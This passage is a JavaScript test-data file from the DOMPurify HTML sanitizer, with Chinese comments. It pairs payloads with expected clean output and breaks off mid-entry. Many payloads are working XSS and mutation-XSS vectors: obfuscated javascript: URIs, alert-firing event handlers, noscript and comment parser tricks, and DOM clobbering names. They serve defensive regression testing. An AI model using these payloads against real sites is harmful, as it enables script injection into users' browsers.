/**
 * DOMPurify 共享字符串语料：这里只导出数据，不执行清洗或插入。
 * test/jsdom-node.js、test/happydom-node.js 和 test/browser/entry.js 读取它，
 * 将全量数据传给 testSuite 的 sanitizationTestCases；每条以默认配置调用 sanitize。
 * 含 alert 字样的 payload 还被筛入 xssTestCases，分别经原生 innerHTML、jQuery.html
 * 与 iframe document.write 插入，使用 runner 安装的 alert 探针检查执行。
 *
 * 以下“期望”描述已有 expected 的形状。数组要求实际输出等于某个完整候选，
 * 用于容纳属性顺序、大小写、空白、自闭合及解析结构差异；标量则由 assert.contains
 * 采用 expected.indexOf(actual) 检查子串，空输出也会通过。标量数据的保留形状
 * 因而不是严格相等断言；清洗结果与插入执行检查分别由 test-suite.js 定义。
 * CSS、URI 编码文档和属性内的标记文字不在此文件中解码或执行，相关边界见逐条注释。
 */
// prettier-ignore
export default [
  /**
   * SVG image 的 xlink:href 为编码 SVG data URI，并带多项 style；
   * 期望保留 URI/style、删除 preserveratio，检查媒体 URI与名称准入，不解码 URI 内部标记。
   */
  {
    'title': "Don't remove data URIs from SVG images (see #205)",
    'payload':
      '<svg><image id="v-146" width="500" height="500" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="data:image/svg+xml;utf8,%3Csvg%20viewBox%3D%220%200%20100%20100%22%20height%3D%22100%22%20width%3D%22100%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20data-name%3D%22Layer%201%22%20id%3D%22Layer_1%22%3E%0A%20%20%3Ctitle%3ECompute%3C%2Ftitle%3E%0A%20%20%3Cg%3E%0A%20%20%20%20%3Crect%20fill%3D%22%239d5025%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2224.74%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%20%20%3Crect%20fill%3D%22%23f58536%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2222.26%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E" preserveratio="true" style="border-color: rgb(51, 51, 51); box-sizing: border-box; color: rgb(51, 51, 51); cursor: move; font-family: sans-serif; font-size: 14px; line-height: 20px; outline-color: rgb(51, 51, 51); text-size-adjust: 100%; column-rule-color: rgb(51, 51, 51); -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); -webkit-text-emphasis-color: rgb(51, 51, 51); -webkit-text-fill-color: rgb(51, 51, 51); -webkit-text-stroke-color: rgb(51, 51, 51); user-select: none; vector-effect: non-scaling-stroke;"></image></svg>',
    'expected':
      '<svg><image id="v-146" width="500" height="500" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="data:image/svg+xml;utf8,%3Csvg%20viewBox%3D%220%200%20100%20100%22%20height%3D%22100%22%20width%3D%22100%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20data-name%3D%22Layer%201%22%20id%3D%22Layer_1%22%3E%0A%20%20%3Ctitle%3ECompute%3C%2Ftitle%3E%0A%20%20%3Cg%3E%0A%20%20%20%20%3Crect%20fill%3D%22%239d5025%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2224.74%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%20%20%3Crect%20fill%3D%22%23f58536%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2222.26%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E" style="border-color: rgb(51, 51, 51); box-sizing: border-box; color: rgb(51, 51, 51); cursor: move; font-family: sans-serif; font-size: 14px; line-height: 20px; outline-color: rgb(51, 51, 51); text-size-adjust: 100%; column-rule-color: rgb(51, 51, 51); -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); -webkit-text-emphasis-color: rgb(51, 51, 51); -webkit-text-fill-color: rgb(51, 51, 51); -webkit-text-stroke-color: rgb(51, 51, 51); user-select: none; vector-effect: non-scaling-stroke;"></image></svg>'
  },
  /**
   * 相同 SVG image 改用无前缀 href；
   * 期望 URI/style 保留、preserveratio 删除，检查 data URI 准入同时支持 href 与 xlink:href。
   */
  {
    'title': "Don't remove data URIs from SVG images, with href attribute",
    'payload':
      '<svg><image id="v-146" width="500" height="500" xmlns:xlink="http://www.w3.org/1999/xlink" href="data:image/svg+xml;utf8,%3Csvg%20viewBox%3D%220%200%20100%20100%22%20height%3D%22100%22%20width%3D%22100%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20data-name%3D%22Layer%201%22%20id%3D%22Layer_1%22%3E%0A%20%20%3Ctitle%3ECompute%3C%2Ftitle%3E%0A%20%20%3Cg%3E%0A%20%20%20%20%3Crect%20fill%3D%22%239d5025%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2224.74%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%20%20%3Crect%20fill%3D%22%23f58536%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2222.26%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E" preserveratio="true" style="border-color: rgb(51, 51, 51); box-sizing: border-box; color: rgb(51, 51, 51); cursor: move; font-family: sans-serif; font-size: 14px; line-height: 20px; outline-color: rgb(51, 51, 51); text-size-adjust: 100%; column-rule-color: rgb(51, 51, 51); -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); -webkit-text-emphasis-color: rgb(51, 51, 51); -webkit-text-fill-color: rgb(51, 51, 51); -webkit-text-stroke-color: rgb(51, 51, 51); user-select: none; vector-effect: non-scaling-stroke;"></image></svg>',
    'expected':
      '<svg><image id="v-146" width="500" height="500" xmlns:xlink="http://www.w3.org/1999/xlink" href="data:image/svg+xml;utf8,%3Csvg%20viewBox%3D%220%200%20100%20100%22%20height%3D%22100%22%20width%3D%22100%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20data-name%3D%22Layer%201%22%20id%3D%22Layer_1%22%3E%0A%20%20%3Ctitle%3ECompute%3C%2Ftitle%3E%0A%20%20%3Cg%3E%0A%20%20%20%20%3Crect%20fill%3D%22%239d5025%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2224.74%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%20%20%3Crect%20fill%3D%22%23f58536%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2222.26%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E" style="border-color: rgb(51, 51, 51); box-sizing: border-box; color: rgb(51, 51, 51); cursor: move; font-family: sans-serif; font-size: 14px; line-height: 20px; outline-color: rgb(51, 51, 51); text-size-adjust: 100%; column-rule-color: rgb(51, 51, 51); -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); -webkit-text-emphasis-color: rgb(51, 51, 51); -webkit-text-fill-color: rgb(51, 51, 51); -webkit-text-stroke-color: rgb(51, 51, 51); user-select: none; vector-effect: non-scaling-stroke;"></image></svg>'
  },
  /**
   * dialog 带 role/aria-labelledby，内嵌按钮带 aria-label；
   * 期望结构和两类 ARIA 属性保留，检查默认无障碍名称准入。
   */
  {
    'title': "Don't remove ARIA attributes if not prohibited (see #203)",
    'payload':
      '<div aria-labelledby="msg--title" role="dialog" class="msg"><button class="modal-close" aria-label="close" type="button"><i class="icon-close"></i>some button</button></div>',
    'expected':
      '<div aria-labelledby="msg--title" role="dialog" class="msg"><button class="modal-close" aria-label="close" type="button"><i class="icon-close"></i>some button</button></div>'
  },
  /**
   * 两个 checkbox 分别带 checked 与空 onclick；
   * 期望布尔属性序列化为空值、事件删除，区分合法空属性和 handler 名称。
   */
  {
    'title': "Don't remove binary attributes if considered safe (see #168)",
    'payload': '<input type=checkbox checked><input type=checkbox onclick>',
    'expected': '<input type="checkbox" checked=""><input type="checkbox">'
  },
  /**
   * SVG defs/filter/feGaussianBlur 与 rect 的 filter 引用；
   * 期望保留过滤器和关联属性，检查 SVG 滤镜元素默认准入。
   */
  {
    'title': 'Avoid over-zealous stripping of SVG filter elements (see #144)',
    'payload':
      '<svg><defs><filter id="f1"><feGaussianBlur in="SourceGraphic" stdDeviation="15" /></filter></defs><rect width="90" height="90" stroke="green" stroke-width="3" fill="yellow" filter="url(#f1)" /></svg>',
    'expected':
      '<svg><defs><filter id="f1"><feGaussianBlur in="SourceGraphic" stdDeviation="15"></feGaussianBlur></filter></defs><rect width="90" height="90" stroke="green" stroke-width="3" fill="yellow" filter="url(#f1)"></rect></svg>'
  },
  /**
   * SVG text 带 dominant-baseline；
   * 期望该排版属性保留，检查 SVG 属性集合。
   */
  {
    'title':
      'Keep the SVG dominant-baseline presentation attribute (see #1525)',
    'payload': '<svg><text dominant-baseline="middle">x</text></svg>',
    'expected': '<svg><text dominant-baseline="middle">x</text></svg>'
  },
  /**
   * SVG text 的 text-orientation 控制方向；
   * 期望名称和值保留，检查 SVG 文本属性准入。
   */
  {
    'title': 'Keep the SVG text-orientation presentation attribute (see #1525)',
    'payload': '<svg><text text-orientation="upright">y</text></svg>',
    'expected': '<svg><text text-orientation="upright">y</text></svg>'
  },
  /**
   * SVG 元素带 pointer-events；
   * 期望原属性保留，检查允许的交互表现属性。
   */
  {
    'title': 'Keep the SVG pointer-events presentation attribute',
    'payload':
      '<svg><rect pointer-events="none" width="10" height="10"/></svg>',
    'expected':
      '<svg><rect pointer-events="none" width="10" height="10"></rect></svg>'
  },
  /**
   * SVG 形状带 vector-effect；
   * 期望值保留，检查非缩放描边属性准入。
   */
  {
    'title': 'Keep the SVG vector-effect presentation attribute (see #447)',
    'payload':
      '<svg><circle vector-effect="non-scaling-stroke" cx="0" cy="0" r="30"/></svg>',
    'expected':
      '<svg><circle vector-effect="non-scaling-stroke" cx="0" cy="0" r="30"></circle></svg>'
  },
  /**
   * b 的 href 与 title 都写 javascript:；
   * 期望只删 href、保留 title，检查 URI 属性与 URI-safe 普通文字的区别。
   */
  {
    'title': 'safe usage of URI-like attribute values (see #135)',
    'payload': '<b href="javascript:alert(1)" title="javascript:alert(2)"></b>',
    'expected': '<b title="javascript:alert(2)"></b>'
  },
  /**
   * 相同 data URI 分别作为 img/audio/video/source/div 的 src；
   * 期望媒体标签保留、div 的 src 删除，检查 data URI 标签范围。
   */
  {
    'title': 'src Attributes for IMG, AUDIO, VIDEO and SOURCE (see #131)',
    'payload':
      '<img src="data:,123"><audio src="data:,456"></audio><video src="data:,789"></video><source src="data:,012"><div src="data:,345">',
    'expected':
      '<img src="data:,123"><audio src="data:,456"></audio><video src="data:,789"></video><source src="data:,012"><div></div>'
  },
  /**
   * 两张 img 分别以 id/name 指定 createElement；
   * 期望冲突名称消失而 src 保留，检查 DOM 命名碰撞过滤。
   */
  {
    'title': 'DOM Clobbering against document.createElement() (see #47)',
    'payload': '<img src=x name=createElement><img src=y id=createElement>',
    'expected': '<img src="x"><img src="y">'
  },
  /**
   * img 名为 cookie；
   * 期望删除 name，检查与 document 成员同名的属性。
   */
  {
    'title': 'DOM Clobbering against an empty cookie',
    'payload': '<img src=x name=cookie>',
    'expected': '<img src="x">'
  },
  /**
   * href 在 javascript 协议前放 U+2028；
   * 期望删 href，检查 URI 空白归一化。
   */
  {
    'title': 'JavaScript URIs using Unicode LS/PS I',
    'payload': "123<a href='\u2028javascript:alert(1)'>I am a dolphin!</a>",
    'expected': '123<a>I am a dolphin!</a>'
  },
  /**
   * 相同 U+2028 前导字符换用另一段链接文字；
   * 期望去掉危险 href，检查文本变化不影响协议规则。
   */
  {
    'title': 'JavaScript URIs using Unicode LS/PS II',
    'payload': "123<a href='\u2028javascript:alert(1)'>I am a dolphin too!</a>",
    'expected': '123<a>I am a dolphin too!</a>'
  },
  /**
   * 多种 Unicode 空白及其实体写在 javascript 协议前；
   * 期望链接 URI 删除，检查实体解码及 URI 空白折叠后的判定。
   */
  {
    'title': 'JavaScript URIs using Unicode Whitespace',
    'payload':
      "123<a href=' javascript:alert(1)'>CLICK</a><a href='&#xA0javascript:alert(1)'>CLICK</a><a href='&#x1680;javascript:alert(1)'>CLICK</a><a href='&#x180E;javascript:alert(1)'>CLICK</a><a href='&#x2000;javascript:alert(1)'>CLICK</a><a href='&#x2001;javascript:alert(1)'>CLICK</a><a href='&#x2002;javascript:alert(1)'>CLICK</a><a href='&#x2003;javascript:alert(1)'>CLICK</a><a href='&#x2004;javascript:alert(1)'>CLICK</a><a href='&#x2005;javascript:alert(1)'>CLICK</a><a href='&#x2006;javascript:alert(1)'>CLICK</a><a href='&#x2006;javascript:alert(1)'>CLICK</a><a href='&#x2007;javascript:alert(1)'>CLICK</a><a href='&#x2008;javascript:alert(1)'>CLICK</a><a href='&#x2009;javascript:alert(1)'>CLICK</a><a href='&#x200A;javascript:alert(1)'>CLICK</a><a href='&#x200B;javascript:alert(1)'>CLICK</a><a href='&#x205f;javascript:alert(1)'>CLICK</a><a href='&#x3000;javascript:alert(1)'>CLICK</a>",
    'expected':
      '123<a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a>'
  },
  /**
   * img 使用 data:image URI；
   * 期望 src 原样保留，检查允许的媒体 data 协议。
   */
  {
    'title': 'Image with data URI src',
    'payload': '<img src=data:image/jpeg,ab798ewqxbaudbuoibeqbla>',
    'expected': '<img src="data:image/jpeg,ab798ewqxbaudbuoibeqbla">'
  },
  /**
   * data URI 前有 CR/LF；
   * 期望去掉前导空白后保留媒体 src，检查属性值 trim 与序列化。
   */
  {
    'title': 'Image with data URI src with whitespace',
    'payload': '<img src="\r\ndata:image/jpeg,ab798ewqxbaudbuoibeqbla">',
    'expected': '<img src="data:image/jpeg,ab798ewqxbaudbuoibeqbla">'
  },
  /**
   * img src 为带 while 脚本的 javascript:；
   * 期望无 src，检查危险协议拒绝，不执行脚本文本。
   */
  {
    'title': 'Image with JavaScript URI src (DoS on Firefox)',
    'payload': "<img src='javascript:while(1){}'>",
    'expected': '<img>'
  },
  /**
   * a href 使用 data URI；
   * 期望只留链接文字，检查默认 data URI 标签集合不含 a。
   */
  {
    'title': 'Link with data URI href',
    'payload': '<a href=data:,evilnastystuff>clickme</a>',
    'expected': '<a>clickme</a>'
  },
  /**
   * 纯数字文本 123456；
   * 期望原文本，检查无标记输入的字符串路径。
   */
  {
    'title': 'Simple numbers',
    'payload': '123456',
    'expected': '123456'
  },
  /**
   * form 内同名控件尝试遮蔽成员并带鼠标事件；
   * 候选为清理后 form 或空输出，容纳具名属性实现差异。
   */
  {
    'title': 'DOM clobbering XSS by @irsdl using attributes',
    'payload':
      '<form onmouseover=\'alert(1)\'><input name="attributes"><input name="attributes">',
    'expected': ['', '<form><input><input></form>']
  },
  /**
   * 控件名 getElementById；
   * 期望删除该 name，检查文档成员碰撞。
   */
  {
    'title': 'DOM clobbering: getElementById',
    'payload': '<img src=x name=getElementById>',
    'expected': '<img src="x">'
  },
  /**
   * a 的 id 为 location、href 安全；
   * 期望删 id 而留 href/文字，检查名称过滤独立于 URI 准入。
   */
  {
    'title': 'DOM clobbering: location',
    'payload': '<a href="#some-code-here" id="location">invisible',
    'expected': '<a href="#some-code-here">invisible</a>'
  },
  /**
   * div/form/input 三级分别带 onclick/onsubmit/onfocus，控件名 parentNode；
   * 期望事件与 name 全部消失，检查多层属性过滤及名称碰撞。
   */
  {
    'title': 'onclick, onsubmit, onfocus; DOM clobbering: parentNode',
    'payload':
      '<div onclick=alert(0)><form onsubmit=alert(1)><input onfocus=alert(2) name=parentNode>123</form></div>',
    'expected': '<div><form><input>123</form></div>'
  },
  /**
   * form 控件名 nodeName；
   * 期望清理 handler/name，检查遍历依赖成员碰撞。
   */
  {
    'title': 'onsubmit, onfocus; DOM clobbering: nodeName',
    'payload':
      '<form onsubmit=alert(1)><input onfocus=alert(2) name=nodeName>123</form>',
    'expected': '<form><input>123</form>'
  },
  /**
   * form 控件名 nodeType；
   * 期望清理 handler/name，检查节点类型成员碰撞。
   */
  {
    'title': 'onsubmit, onfocus; DOM clobbering: nodeType',
    'payload':
      '<form onsubmit=alert(1)><input onfocus=alert(2) name=nodeType>123</form>',
    'expected': '<form><input>123</form>'
  },
  /**
   * form 控件名 children；
   * 期望清理 handler/name，检查子节点成员碰撞。
   */
  {
    'title': 'onsubmit, onfocus; DOM clobbering: children',
    'payload':
      '<form onsubmit=alert(1)><input onfocus=alert(2) name=children>123</form>',
    'expected': '<form><input>123</form>'
  },
  /**
   * form 控件名 attributes；
   * 期望清理 handler/name，检查属性列表成员碰撞。
   */
  {
    'title': 'onsubmit, onfocus; DOM clobbering: attributes',
    'payload':
      '<form onsubmit=alert(1)><input onfocus=alert(2) name=attributes>123</form>',
    'expected': '<form><input>123</form>'
  },
  /**
   * form 控件名 removeChild；
   * 期望清理 handler/name，检查删除方法碰撞。
   */
  {
    'title': 'onsubmit, onfocus; DOM clobbering: removeChild',
    'payload':
      '<form onsubmit=alert(1)><input onfocus=alert(2) name=removeChild>123</form>',
    'expected': '<form><input>123</form>'
  },
  /**
   * form 控件名 removeAttributeNode；
   * 期望清理 handler/name，检查属性删除方法碰撞。
   */
  {
    'title': 'onsubmit, onfocus; DOM clobbering: removeAttributeNode',
    'payload':
      '<form onsubmit=alert(1)><input onfocus=alert(2) name=removeAttributeNode>123</form>',
    'expected': '<form><input>123</form>'
  },
  /**
   * form 控件名 setAttribute；
   * 期望清理 handler/name，检查写属性方法碰撞。
   */
  {
    'title': 'onsubmit, onfocus; DOM clobbering: setAttribute',
    'payload':
      '<form onsubmit=alert(1)><input onfocus=alert(2) name=setAttribute>123</form>',
    'expected': '<form><input>123</form>'
  },
  /**
   * 独立 style 放在字符串开头；
   * 期望空输出，检查 body 返回模式排除解析到 head 的节点。
   */
  {
    'title': '&gt;style&lt;',
    'payload': '<style>*{color: red}</style>',
    'expected': ''
  },
  /**
   * 普通 p 文本没有危险属性；
   * 期望完整保留，作为允许 HTML 的对照。
   */
  {
    'title': 'HTML paragraph with text',
    'payload': '<p>hello</p>',
    'expected': '<p>hello</p>'
  },
  /**
   * listing 内编码的 img/onerror 文本；
   * 期望实体文字保留且 listing 包装消失，检查惰性文本不会变为活动属性。
   */
  {
    'title': 'mXSS Variation I',
    'payload':
      '<listing>&lt;img onerror="alert(1);//" src=x&gt;<t t></listing>',
    'expected': '&lt;img onerror="alert(1);//" src=x&gt;'
  },
  /**
   * img 的畸形引号属性夹入 onerror；
   * 期望 src 与空 id，无活动事件，检查解析器拆分属性后的过滤。
   */
  {
    'title': 'mXSS Variation II',
    'payload': "<img src=x id/=' onerror=alert(1)//'>",
    'expected': '<img src="x" id="">'
  },
  /**
   * textarea 与畸形注释并存；
   * 期望 textarea 留下、注释删掉，检查注释节点净化。
   */
  {
    'title': 'Textarea and comments enabling img element',
    'payload':
      '<textarea>@shafigullin</textarea><!--</textarea><img src=x onerror=alert(1)>-->',
    'expected': '<textarea>@shafigullin</textarea>'
  },
  /**
   * noscript 的注释关闭边界拼接 b；
   * 期望只留空 b，检查 fallback/raw-text 解析后的裁剪。
   */
  {
    'title': 'Img element inside noscript terminated inside comment',
    'payload':
      '<b><noscript><!-- </noscript><img src=x onerror=alert(1) --></noscript>',
    'expected': '<b></b>'
  },
  /**
   * noscript title/alt 值中夹闭合标签和 img；
   * 候选允许空 b、无 handler 图片或属性内惰性标记，记录 scripting flag 与引擎解析差异。
   */
  {
    'title': 'Img element inside noscript terminated inside attribute',
    'payload':
      '<b><noscript><a alt="</noscript><img src=x onerror=alert(1)>"></noscript>',
    'expected': [
      '<b></b>',
      '<b><img src="x">"&gt;</b>',
      '<b><a alt="</noscript><img src=x onerror=alert(1)>"></a></b>',
      '<b><a alt="&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;"></a></b>'
    ]
  },
  /**
   * 嵌套 template 内有危险 img；
   * 期望模板结构与 src 保留、onerror 删除，检查 content 的递归清洗。
   */
  {
    'title': 'Img element inside shadow DOM template',
    'payload':
      '<body><template><s><template><s><img src=x onerror=alert(1)>@shafigullin</s></template></s></template>',
    'expected':
      '<template><s><template><s><img src="x">@shafigullin</s></template></s></template>'
  },
  /**
   * javascript 协议夹 ASCII 控制字符；
   * 期望 href 删除，检查 URI 空白归一化。
   */
  {
    'title': 'Low-range-ASCII obfuscated JavaScript URI',
    'payload': '<a href="\u0001java\u0003script:alert(1)">@shafigullin<a>',
    'expected': '<a>@shafigullin</a><a></a>'
  },
  /**
   * option/style/脚本闭合次序错位；
   * 期望只剩控制字符与空 option，检查选择控件的解析修复及拒绝子树。
   */
  {
    'title': 'Img inside style inside broken option element',
    'payload':
      '\u0001<option><style></option></select><b><img src=x onerror=alert(1)></style></option>',
    'expected': '\u0001<option></option>'
  },
  /**
   * option 内夹 iframe 再拼 script；
   * 期望空 option，检查禁止容器的内容丢弃。
   */
  {
    'title': 'Iframe inside option element',
    'payload': '<option><iframe></select><b><script>alert(1)</script>',
    'expected': '<option></option>'
  },
  /**
   * 输入仅不匹配的结束标签；
   * 期望空串，检查解析器忽略孤立闭合标记。
   */
  {
    'title': 'Closing Iframe and option',
    'payload': '</iframe></option>',
    'expected': ''
  },
  /**
   * b 内 style 使用自闭合形式；
   * 期望空 b，检查 HTML raw-text 结构被删除。
   */
  {
    'title': 'Image after style to trick jQuery tag-completion',
    'payload': '<b><style><style/><img src=x onerror=alert(1)>',
    'expected': '<b></b>'
  },
  /**
   * 多层 style 起始标签混用自闭合；
   * 期望空 b，检查畸形 raw-text 内容不进入结果。
   */
  {
    'title': 'Image after self-closing style to trick jQuery tag-completion',
    'payload': '<b><style><style////><img src=x onerror=alert(1)></style>',
    'expected': '<b></b>'
  },
  /**
   * MathML menclose 与多种颜色/布局属性；
   * 候选保留允许结构并容纳属性顺序差异，检查 MathML 属性准入。
   */
  {
    'title': 'MathML example',
    'payload':
      '<math xmlns="http://www.w3.org/1998/Math/MathML" display="block">\n  <mrow>\n    <menclose notation="box"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation="box"><mi mathcolor="#FF0000">a</mi></menclose><mo>,</mo>\n    <menclose notation="box" mathcolor="#FF0000"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation="box" mathbackground="#80FF80"><mi mathcolor="#FF0000">a</mi></menclose><mo>,</mo>\n    <menclose notation="box" mathcolor="#FF0000" mathbackground="#80FF80"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation="box"><mi mathbackground="#80FF80">a</mi></menclose>\n  </mrow>\n</math>',
    'expected': [
      '<math xmlns="http://www.w3.org/1998/Math/MathML" display="block">\n  <mrow>\n    <menclose notation="box"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation="box"><mi mathcolor="#FF0000">a</mi></menclose><mo>,</mo>\n    <menclose mathcolor="#FF0000" notation="box"><mi>a</mi></menclose><mo>,</mo>\n    <menclose mathbackground="#80FF80" notation="box"><mi mathcolor="#FF0000">a</mi></menclose><mo>,</mo>\n    <menclose mathbackground="#80FF80" mathcolor="#FF0000" notation="box"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation="box"><mi mathbackground="#80FF80">a</mi></menclose>\n  </mrow>\n</math>',
      '<math xmlns="http://www.w3.org/1998/Math/MathML" display="block">\n  <mrow>\n    <menclose notation="box"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation="box"><mi mathcolor="#FF0000">a</mi></menclose><mo>,</mo>\n    <menclose notation="box" mathcolor="#FF0000"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation="box" mathbackground="#80FF80"><mi mathcolor="#FF0000">a</mi></menclose><mo>,</mo>\n    <menclose notation="box" mathcolor="#FF0000" mathbackground="#80FF80"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation="box"><mi mathbackground="#80FF80">a</mi></menclose>\n  </mrow>\n</math>'
    ]
  },
  /**
   * body/adoptNode/firstElementChild 名称与 SVG onload 混合；
   * 期望图片无冲突 name、SVG 无事件，检查命名与事件两类过滤。
   */
  {
    'title': 'DOM clobbering attack using name=body',
    'payload':
      '<image name=body><image name=adoptNode>@mmrupp<image name=firstElementChild><svg onload=alert(1)>',
    'expected': '<img><img>@mmrupp<img><svg></svg>'
  },
  /**
   * 另一组控制空白混入 javascript href；
   * 期望危险 URI 消失，检查属性归一化。
   */
  {
    'title': 'Special escapes in protocol handler for XSS in Blink',
    'payload': '<a href="\u0001java\u0003script:alert(1)">@shafigullin<a>',
    'expected': '<a>@shafigullin</a><a></a>'
  },
  /**
   * activeElement 名称与 SVG onload；
   * 期望删冲突 name 和事件，检查 DOM 名称及 SVG handler。
   */
  {
    'title': 'DOM clobbering attack using activeElement',
    'payload': '<image name=activeElement><svg onload=alert(1)>',
    'expected': '<img><svg></svg>'
  },
  /**
   * name=body 图片与 autofocus/onload 的 keygen；
   * 期望只留无冲突图片与安全 SVG，检查名称、事件及拒绝标签。
   */
  {
    'title': 'DOM clobbering attack using name=body and injecting SVG + keygen',
    'payload':
      '<image name=body><img src=x><svg onload=alert(1); autofocus>, <keygen onfocus=alert(1); autofocus>',
    'expected': '<img><img src="x"><svg>, </svg>'
  },
  /**
   * div 上未知属性和 onmouseout；
   * 期望空属性 div 与文字，检查普通属性名称过滤。
   */
  {
    'title': 'Bypass using multiple unknown attributes',
    'payload':
      '<div onmouseout="javascript:alert(/superevr/)" x=yscript: n>@superevr</div>',
    'expected': '<div>@superevr</div>'
  },
  /**
   * button 的未知 remove 属性与两个鼠标事件；
   * 期望只留按钮文字，检查事件和未知名称删除。
   */
  {
    'title': 'Bypass using event handlers and unknown attributes',
    'payload':
      '<button remove=me onmousedown="javascript:alert(1);" onclick="javascript:alert(1)" >@giutro',
    'expected': '<button>@giutro</button>'
  },
  /**
   * a 的 javascript href 与 onclick；
   * 期望仅链接文字，检查名称和协议联合过滤。
   */
  {
    'title':
      'Bypass using DOM bugs when dealing with JS URIs in arbitrary attributes',
    'payload':
      '<a href="javascript:123" onclick="alert(1)">CLICK ME (bypass by @shafigullin)</a>',
    'expected': '<a>CLICK ME (bypass by @shafigullin)</a>'
  },
  /**
   * 历史 isindex 带事件和 label 属性；
   * 旧标量期望显示解析器生成的 form/input，检查已解析树的过滤，不表示库主动展开 isindex。
   */
  {
    'title':
      'Bypass using DOM bugs when dealing with JS URIs in arbitrary attributes (II)',
    'payload':
      '<isindex x="javascript:" onmouseover="alert(1)" label="variation of bypass by @giutro">',
    'expected':
      '<form><hr><label>This is a searchable index. Enter search keywords: <input label="variation of bypass by @giutro" name="isindex"></label><hr></form>'
  },
  /**
   * div 带未知 wow 属性与 onmouseover；
   * 期望 div/文字保留、两属性删除，检查普通名称准入。
   */
  {
    'title': 'Bypass using unknown attributes III',
    'payload': '<div wow=removeme onmouseover=alert(1)>text',
    'expected': '<div>text</div>'
  },
  /**
   * input 的未知属性/autofocus/onfocus 和 SVG onload；
   * 期望无属性 input 与安全 SVG，检查输入属性及事件删除。
   */
  {
    'title': 'Bypass using unknown attributes IV',
    'payload':
      '<input x=javascript: autofocus onfocus=alert(1)><svg id=1 onload=alert(1)></svg>',
    'expected': '<input><svg id="1"></svg>'
  },
  /**
   * 历史 isindex 带 javascript src、鼠标事件及 label；
   * 旧标量期望显示解析器展开的 form/input，检查已解析结构过滤，不表示库生成表单。
   */
  {
    'title': 'Bypass using unknown attributes V',
    'payload':
      '<isindex src="javascript:" onmouseover="alert(1)" label="bypass by @giutro" />',
    'expected':
      '<form><hr><label>This is a searchable index. Enter search keywords: <input name="isindex" label="bypass by @giutro"></label><hr></form>'
  },
  /**
   * 与前面重复同一 javascript href/onclick 链接输入；
   * 期望只保留 a 文本，检查危险 URI 和事件过滤。
   */
  {
    'title': 'Bypass using JS URI in href',
    'payload':
      '<a href="javascript:123" onclick="alert(1)">CLICK ME (bypass by @shafigullin)</a>',
    'expected': '<a>CLICK ME (bypass by @shafigullin)</a>'
  },
  /**
   * form action 的 javascript 协议中夹换行；
   * 期望 action 消失、按钮保留，检查 URI 控制字符归一化。
   */
  {
    'payload':
      '<form action="javasc\nript:alert(1)"><button>XXX</button></form>',
    'expected': '<form><button>XXX</button></form>'
  },
  /**
   * button 用外部 form 和 javascript formaction，并带尾部杂字；
   * 期望按钮安全属性及转义文字，检查关联/URI 属性删除。
   */
  {
    'payload':
      '<div id="1"><form id="foobar"></form><button form="foobar" formaction="javascript:alert(1)">X</button>//["\'`-->]]>]</div>',
    'expected':
      '<div id="1"><form id="foobar"></form><button>X</button>//["\'`--&gt;]]&gt;]</div>'
  },
  /**
   * meta 声明编码，后续为 UTF-7 形状文字；
   * 期望删 meta、文字仍惰性，检查不会按声明重新解码文本。
   */
  {
    'payload':
      '<div id="2"><meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//["\'`-->]]>]</div>',
